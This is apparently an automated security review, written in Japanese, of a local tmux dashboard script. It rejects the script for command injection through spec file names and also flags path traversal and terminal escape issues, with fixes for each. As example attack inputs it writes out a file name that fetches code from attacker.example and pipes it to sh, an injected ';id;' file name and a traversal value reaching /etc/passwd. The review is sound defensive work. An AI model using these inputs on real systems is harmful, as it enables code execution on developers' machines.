---
reviewer: security-reviewer
spec: tmux-dashboard-mvp
executed_at: 2026-04-20T00:20:00Z
reviewed: 2026-04-20
verdict: reject
---

# Security Review: tmux-dashboard-mvp

## 概評

本 Spec はローカル開発者向けの tmux ダッシュボードで、外部ネットワーク境界・認証・暗号・セッション等の OWASP 上位カテゴリは原則該当しません。また、Spec §4 非機能要件において「progress.json / progress.md の内容はそのまま表示、機密情報を書いたときはユーザー責任」と明記されているため、表示内容そのものの sanitize 不足は脆弱とは扱いません。

ただし、スクリプト側には **OWASP A03: Injection (コマンドインジェクション)** に該当する経路が 1 件存在します。`dashboard.sh` の自動探索モードは `specs/*.progress.json` のファイル名から Spec 名を抽出し、そのまま tmux に渡す shell コマンド文字列へ **シングルクォートでエスケープなしで埋め込む** 設計になっており、攻撃者が制御可能なファイル名経由で任意コード実行が成立します。このファイルは spec-leader の成果物として worktree / main 双方に commit されうるため、信頼できない PR / pull による混入経路が現実的に存在します。よって verdict は **reject** とします。

OWASP カテゴリ別ヒート: A03 (Injection) に集中、他は該当軽微。

## Critical

### [security-Critical-1] A03: Injection — Spec 名がシングルクォート付きで tmux のシェルコマンド引数に埋め込まれるため、細工された progress.json ファイル名から任意コマンド実行

**該当**:
- `/home/gassn/my-workflows/worktrees/tmux-dashboard-mvp/tools/dashboard.sh:125`
  ```bash
  tmux new-session -d -s "$SESSION" -n dashboard "bash '$PANE_SCRIPT' '$first'"
  ```
- `/home/gassn/my-workflows/worktrees/tmux-dashboard-mvp/tools/dashboard.sh:129`
  ```bash
  tmux split-window -t "$SESSION:dashboard" "bash '$PANE_SCRIPT' '$spec'"
  ```

**攻撃シナリオ**:

`tmux new-session` / `tmux split-window` の最終引数はシェルコマンド文字列として `/bin/sh -c` 経由で実行されます。Spec 名は以下の経路で決定されます。

1. 引数なしで `dashboard.sh` を起動 → `collect_specs_auto` が `specs/*.progress.json` を glob、`basename "$progress" .progress.json` で Spec 名を抽出
2. その結果を launch_tmux にそのまま渡す

ここで攻撃者が以下のようなファイル名を `specs/` 配下に commit させた場合を考えます:

```
specs/pwn'$(curl -s http://attacker.example/x | sh)#.progress.json
```

`basename .../pwn'$(curl ...)#.progress.json .progress.json` は `pwn'$(curl -s http://attacker.example/x | sh)#` を返し、それが launch_tmux に入ります。

line 125 で展開される文字列は:

```
bash '/path/dashboard-pane.sh' 'pwn'$(curl -s http://attacker.example/x | sh)#'
```

tmux はこれを `sh -c` に渡すため、`$(...)` がサブシェル実行され任意コマンドが走ります。dashboard.sh 実行ユーザー権限 (通常は開発者本人) での RCE が成立します。

**現実的な混入経路**:

- 悪意ある PR が `specs/evil';id;#.progress.json` を追加し、レビューで `specs/` 配下のファイル名だけ目視確認した開発者が merge
- `orchestrator` / `spec-leader` が外部入力 (Issue タイトル等) から Spec 名を生成する将来設計では外部攻撃者が直接制御可能
- 共有 worktree (NFS / 共用マシン) で別ユーザーが `specs/` にファイルを設置

**修正提案**:

tmux に渡す引数に shell 文字列を組み立てず、**exec フォームで引数配列として渡す** のが最も堅牢です。tmux は最終引数を `sh -c` に渡すのでどうしても 1 文字列にする必要がありますが、埋め込む側を printf %q でエスケープするか、環境変数経由で受け渡すことで回避できます。推奨は以下のパターン (環境変数渡し):

```bash
tmux new-session -d -s "$SESSION" -n dashboard \
  -e "DASHBOARD_PANE_SPEC=$first" \
  "bash '$PANE_SCRIPT' \"\$DASHBOARD_PANE_SPEC\""
```

または `printf %q` で安全エスケープ:

```bash
local first_q
first_q=$(printf %q "$first")
tmux new-session -d -s "$SESSION" -n dashboard "bash $(printf %q "$PANE_SCRIPT") $first_q"
```

同時に、入力段で Spec 名を `[A-Za-z0-9._-]+` 等の allowlist に制限するチェックを `collect_specs_auto` / `validate_explicit_specs` の両経路に追加し、不正名はスキップ + warning とすることを推奨します (defense in depth)。

## Major

(なし)

## Minor

### [security-Minor-1] A03 周辺 — `dashboard-pane.sh` における `$spec` のパス結合で path traversal が可能

**該当**:
- `/home/gassn/my-workflows/worktrees/tmux-dashboard-mvp/tools/dashboard-pane.sh:47-49`
  ```bash
  local progress_json="${SPEC_DIR}/${spec}.progress.json"
  local result_json="${SPEC_DIR}/${spec}.result.json"
  local progress_md="${SPEC_DIR}/../worktrees/${spec}/progress.md"
  ```

**攻撃シナリオ**: `dashboard-pane.sh` に `spec="../../../etc/passwd\x00#"` のような値が渡ると、`tail -n 10 "${SPEC_DIR}/../worktrees/../../../etc/passwd#/progress.md"` のように SPEC_DIR 外への参照が組み立てられます。現状は拡張子 `.progress.json` / `progress.md` を suffix として付けるため任意ファイル読み取りは限定的ですが、`progress.md` に関しては suffix がディレクトリ区切り経由で除外できる (`$spec="../foo/../"` 等) ため、任意パスの `progress.md` 相当は読み取り可能です。呼び出し元は dashboard.sh (引数側は Critical-1 で対処) または開発者直叩きなので、ローカルでの情報取得はリスクが限定的で Minor 判定です。

**修正提案**: Critical-1 と同じ allowlist `[A-Za-z0-9._-]+` を `dashboard-pane.sh` 冒頭でも検証し、マッチしなければ「invalid spec name」で exit 1 とすることで、tmux 経由と開発者直叩きの両方を塞げます。

### [security-Minor-2] A03 周辺 — ANSI エスケープシーケンスを含む progress.md が tail 経由で端末に流れ込む

**該当**:
- `/home/gassn/my-workflows/worktrees/tmux-dashboard-mvp/tools/dashboard-pane.sh:83`
  ```bash
  tail -n 10 "$progress_md"
  ```

**攻撃シナリオ**: progress.md は spec-leader が書き込む Markdown で、Spec §4 非機能要件により「内容はそのまま表示、sanitize なし」が設計方針です。ただし ANSI エスケープ (`\x1b]0;title\x07` 等) を含む内容が書き込まれた場合、tail は素通しするため端末のタイトル書き換え・カーソル制御・カラーリング等の **端末エスケープインジェクション** が成立します。Spec が明示的に「ユーザー責任」としているため Critical / Major 扱いはしませんが、将来 progress.md を外部入力 (Issue 本文取り込み等) から自動生成する場合に再検討が必要です。

**修正提案**: 将来 progress.md を外部入力から自動生成するステージが追加された場合、`tail -n 10 "$progress_md" | cat -v` のように制御文字を可視化するか、`sed 's/\x1b/^[/g'` 相当でエスケープ除去を行うことを検討してください。本 MVP では docs 側に「progress.md に外部入力を書かないこと」と明記するだけで十分です。

### [security-Minor-3] `tests/test_dashboard.sh` の `bash -c "$cmd"` は `$REPO_ROOT` / `$TMP_EMPTY` に依存した動的シェル評価

**該当**:
- `/home/gassn/my-workflows/worktrees/tmux-dashboard-mvp/tests/test_dashboard.sh:31`
  ```bash
  output="$(bash -c "$cmd" 2>&1)"
  ```

**攻撃シナリオ**: `$cmd` はテストコード内の固定文字列 + `$REPO_ROOT` (cd + pwd 由来) + `$TMP_EMPTY` (mktemp -d 由来) の連結です。どちらも内部生成で攻撃者制御性は低いですが、`$REPO_ROOT` がシングルクォートを含むパスに置かれた場合 (例: `/tmp/foo'bar/`) 、clone した開発者がテストを走らせるとシェル評価が壊れ、運の悪い組み合わせで予期せぬコマンドを踏む可能性があります。ローカル dev のみで CI/CD に載らないテストハーネスである点を鑑み Minor 判定です。

**修正提案**: `bash -c "$cmd"` を `eval` に近い危険パターンとして避け、`assert_case` をコマンド配列を受け取る関数に書き換えるのが理想です。最低限、テストコード冒頭で `REPO_ROOT` にシングルクォートが含まれていないことを assertion してから進めてください:

```bash
if [[ "$REPO_ROOT" == *\'* || "$TMP_EMPTY" == *\'* ]]; then
  echo "REPO_ROOT / TMP_EMPTY に single quote を含むパスはテスト非対応" >&2
  exit 1
fi
```

## 確認済事項

- 機密情報の hard-coded token / password / 秘密鍵のコミットは見当たらない
- パスワード / セッション / 暗号 / CSRF / SSRF / XSS 等は本 Spec のスコープ外で該当なし
- `set -u` で未定義変数参照を禁止しており、環境変数欠落時のフォールバック挙動も明示 (`DASHBOARD_SPEC_DIR:-...` など)
- `ensure_jq` / `ensure_tmux` で依存コマンド不在時に fail fast している
- `mktemp -d` を test で使用、作成ディレクトリのパーミッションはデフォルト (0700) で安全
- 新規追加依存ライブラリなし (tmux / jq / bash / coreutils は OS 提供)
- ログ / stderr に機密情報をエコーする経路は見当たらない (tmux session 名は環境変数で上書き可能だが、ユーザー自身が設定する値のためスコープ外)
- progress.json の jq パース失敗時は「更新中...」フォールバック、result.json も同様にフォールバックあり、fatal にならない
- world-writable / umask 変更 / SUID / setgid 等ローカル権限昇格要素はスクリプトに含まれない

## 総合判定

**verdict: reject**

根拠: Critical-1 (tmux 経由のコマンドインジェクション) が 1 件。セキュリティ保守的判定ルール「Critical 1 件以上 → reject」に該当します。Minor 3 件は reject 要件には影響しませんが、Critical-1 の修正に合わせて allowlist バリデーションを導入すれば Minor-1 / Minor-2 の相当部分も同時に緩和できるため、修正パッチで一括対応を推奨します。

修正後の再レビュー観点:

1. tmux に渡す shell コマンド文字列の組み立てが `printf %q` or 環境変数経由に変わっているか
2. `collect_specs_auto` / `validate_explicit_specs` / `dashboard-pane.sh` の 3 経路で Spec 名 allowlist (`[A-Za-z0-9._-]+`) が適用されているか
3. 悪意あるファイル名 `specs/evil';id;#.progress.json` を仕込んで dashboard.sh を起動しても id コマンドが走らないことの回帰テストが追加されているか
